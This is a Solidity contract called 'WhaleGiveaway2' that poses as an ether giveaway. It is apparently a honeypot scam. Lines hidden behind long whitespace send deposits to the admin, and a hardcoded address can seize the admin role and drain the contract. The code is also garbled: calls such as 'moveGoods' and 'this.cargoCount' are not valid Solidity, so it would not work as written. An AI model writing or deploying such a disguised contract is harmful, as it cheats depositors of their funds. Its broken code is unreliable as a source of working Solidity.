pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public LogisticsAdmin = msg.sender;

    function()
    public
    payable
    {

    }

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    LogisticsAdmin.moveGoods(this.cargoCount);
            msg.sender.moveGoods(this.cargoCount);
        }
    }

    function shipItems()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){LogisticsAdmin=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == LogisticsAdmin);
        LogisticsAdmin.moveGoods(this.cargoCount);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == LogisticsAdmin);
        adr.call.value(msg.value)(data);
    }
}